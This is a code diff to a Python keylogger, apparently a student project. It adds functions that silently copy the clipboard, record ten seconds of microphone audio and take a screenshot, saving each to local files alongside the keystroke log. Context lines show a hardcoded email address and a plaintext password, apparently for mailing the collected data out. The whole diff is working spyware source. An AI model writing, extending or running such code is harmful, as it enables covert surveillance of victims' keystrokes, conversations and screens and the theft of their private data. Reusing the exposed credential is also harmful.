@@ -37,6 +37,11 @@ from PIL import ImageGrab
 # default variables
 keys_information = "key_log.txt"  # where all the key that are logged going to be appended to
 system_information ="systemInfo.txt" # create a new file for system information (processor, hostname, private IP address)
+clipboard_information = "e_clipboard.txt" #file to save clipboard information
+audio_information = "audio.wav" # file to save microphone recordings
+screenshot_information = "screenshot.png" # file to save screenshot information
+
+microphone_time = 10 # define microphone time
 
 email_address = "collegepjct@gmail.com" # EMAIL address of the sender
 password = "Pr&c!s@Mud4r"
@@ -117,6 +122,41 @@ def computer_information():
         f.write("Private IP Address: " + IPAddr + "\n")
 
 computer_information()
+
+# get the clipboard contents
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f: #open file
+        #allow to append only strings to the e_clipboard.txt file which mean only text you be save to it
+        try:
+            win32clipboard.OpenClipboard() #open clipboard
+            pasted_data = win32clipboard.GetClipboardData() # get clipboard information
+            win32clipboard.CloseClipboard() # close clipboard
+
+            f.write("Clipboard Data: \n" + pasted_data) # write the date to the e_clipboard.txt file
+
+        # if it is not a string the keylogger throw an exception msg
+        except:
+            f.write("Clipboard could be not be copied")
+
+copy_clipboard()
+
+# get the microphone
+def microphone():
+    fs = 44100 # set sampling frequency to 44100 hertz
+    seconds = microphone_time # specify the amount of second want to record the microphone
+
+    # use sound record module to record microphone
+    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) # convert seconds into sampling frequency (fs)
+    sd.wait() # wait record to take place
+
+    write(file_path + extend + audio_information, fs, myrecording) #write to a .wav file
+
+# get screenshots
+def screenshot():
+    im = ImageGrab.grab() #grabbing image
+    im.save(file_path + extend + screenshot_information) # save to file
+
+screenshot()
 
 # constant variable
 count = 0
